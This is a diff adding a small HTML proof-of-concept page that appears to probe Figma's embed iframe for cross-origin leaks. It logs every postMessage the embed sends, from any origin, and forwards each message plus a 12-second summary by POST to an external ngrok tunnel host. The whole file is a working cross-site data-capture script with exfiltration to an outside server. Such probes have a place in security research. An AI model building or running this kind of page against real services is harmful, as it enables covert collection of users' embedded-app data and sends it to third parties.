@@ -1,0 +1,22 @@
+<!doctype html><meta charset=utf-8><title>EMBED-XS</title>
+<body style="font:13px monospace">
+<h3>cross-site figma embed probe</h3>
+<div id=s>waiting…</div>
+<pre id=o style="white-space:pre-wrap;max-height:60vh;overflow:auto"></pre>
+<iframe id=f width="800" height="450" style="border:1px solid #999"
+  src="https://www.figma.com/embed?embed_host=probe&url=https%3A%2F%2Fwww.figma.com%2Fboard%2FTtvNW4o7nHKl6hCZO6KFvQ%2FUntitled"></iframe>
+<script>
+const LAB='https://20ea-2a02-2f00-2003-2400-3907-b341-dcfe-99a1.ngrok-free.app';
+const log=[]; const o=document.getElementById('o');
+function p(x){ log.push(x); o.textContent=log.map(v=>typeof v==='string'?v:JSON.stringify(v)).join('\n'); }
+window.addEventListener('message', e=>{
+  p({from:'postMessage', origin:e.origin, data: (typeof e.data==='object'? e.data : String(e.data))});
+  try{ fetch(LAB+'/log/embed',{method:'POST',mode:'cors',body:JSON.stringify({origin:e.origin,data:e.data})}); }catch(err){}
+});
+const f=document.getElementById('f');
+f.onload=()=>{ p('iframe load event fired'); document.getElementById('s').textContent='iframe loaded'; };
+setTimeout(()=>{ p('--- 12s snapshot, messages: '+log.length+' ---');
+  try{ p('frame location readable: '+f.contentWindow.location.href); }catch(e){ p('frame location BLOCKED (expected): '+e.name); }
+  fetch(LAB+'/log/embed-summary',{method:'POST',mode:'cors',body:JSON.stringify({n:log.length,log})}).catch(()=>{});
+},12000);
+</script></body>
